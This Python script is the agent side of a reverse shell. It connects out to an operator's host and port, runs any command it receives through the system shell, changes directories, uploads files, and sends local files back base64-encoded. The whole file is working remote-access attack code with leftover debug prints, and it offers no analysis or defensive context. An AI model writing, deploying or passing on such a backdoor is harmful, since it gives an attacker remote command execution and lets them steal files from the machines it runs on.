#!/usr/bin/python3

import os
import sys
import json
import base64
import socket
import subprocess
from time import sleep
from termcolor import colored

count = 1


def s_send(encoded_data):
    json_data = json.dumps(encoded_data)
    global count
    print(count)
    count = count + 1
    print(type(json_data))
    print(type(json_data.encode("utf-8")))
    sock.send(json_data.encode("utf-8"))
    print(count)
    count = count + 1

def s_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024).decode("utf-8")
            return json.loads(data)
        except ValueError:
            continue
        except ConnectionResetError:
            sys.exit()

def shell():
    global count
    while True:
        command = s_recv()
        if command == "q":
            break
        elif command[:2] =="cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            try:
                with open(command[9:], "r") as fout:
                    data = fout.read()
                    print(type(data))
                    print(count)
                    count = count + 1
                    encoded_data = base64.b64encode(data)
                    print(count)
                    count = count + 1
                    print(type(encoded_data))
                    print(count)
                    count = count + 1
                    s_send(encoded_data)
            except:
                print(colored("Download Failed !!!", "red"))
                print(socket.error)
        elif command[:6] == "upload":
            with open(command[7:], "wb") as fin:
                file_data = s_recv()
                fin.write(base64.b64decode(file_data))
        else:
            proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
            result = proc.stdout.read() + proc.stderr.read()
            s_send(result.decode("utf-8"))


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((sys.argv[1],int(sys.argv[2])))


shell()
sock.close()
print(colored("Closing connection !!!", "red"))